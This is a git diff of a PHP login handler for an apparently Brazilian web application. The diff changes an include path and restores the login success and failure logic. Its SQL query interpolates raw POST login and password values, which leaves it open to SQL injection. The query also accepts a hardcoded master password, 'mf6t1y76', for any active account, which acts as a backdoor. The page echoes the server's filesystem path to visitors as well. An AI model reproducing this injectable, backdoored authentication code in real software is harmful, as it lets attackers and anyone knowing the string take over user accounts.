@@ -1,5 +1,5 @@
 <?php
-include("{$_SERVER['DOCUMENT_ROOT']}/bkManaus/lib/includes.php");
+include("{$_SERVER['DOCUMENT_ROOT']}/lib/includes.php");
 
     if($_POST['acao'] == 'login'){
         $login = $_POST['login'];
@@ -8,30 +8,24 @@ include("{$_SERVER['DOCUMENT_ROOT']}/bkManaus/lib/includes.php");
         $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76') and situacao = '1' and deletado != '1'";
         $result = sisLog($query);
 
-        // if(mysqli_num_rows($result)){
-        //     $d = mysqli_fetch_object($result);
-        //     $_SESSION['appLogin'] = $d;
-        //     $retorno = [
-        //         'sucesso' => true,
-        //         'appLogin' => $d->codigo,
-        //         'ManterConnectado' => $_POST['ManterConnectado'],
-        //         'msg' => 'Login Realizado com sucesso',
-        //     ];
-        // }else{
-        //     $retorno = [
-        //         'sucesso' => false,
-        //         'appLogin' => false,
-        //         'ManterConnectado' => false,
-        //         'msg' => 'Ocorreu um erro no seu login',
-        //     ];
-        // }
-
+        if(mysqli_num_rows($result)){
+            $d = mysqli_fetch_object($result);
+            $_SESSION['appLogin'] = $d;
+            $retorno = [
+                'sucesso' => true,
+                'appLogin' => $d->codigo,
+                'ManterConnectado' => $_POST['ManterConnectado'],
+                'msg' => 'Login Realizado com sucesso',
+            ];
+        }else{
             $retorno = [
                 'sucesso' => false,
                 'appLogin' => false,
                 'ManterConnectado' => false,
                 'msg' => 'Ocorreu um erro no seu login',
-            ];        
+            ];
+        }
+    
         echo json_encode($retorno);
         exit();
     }
@@ -190,7 +184,7 @@ include("{$_SERVER['DOCUMENT_ROOT']}/bkManaus/lib/includes.php");
             <a href="#" class="forgot-password">
                 Esqueceu a senha?
             </a>
-            <?="{$_SERVER['DOCUMENT_ROOT']}/bkManaus/lib/includes.php"?>
+            <?="{$_SERVER['DOCUMENT_ROOT']}/lib/includes.php"?>
         </div><!-- /card-container -->
     </div><!-- /container -->
 </div>
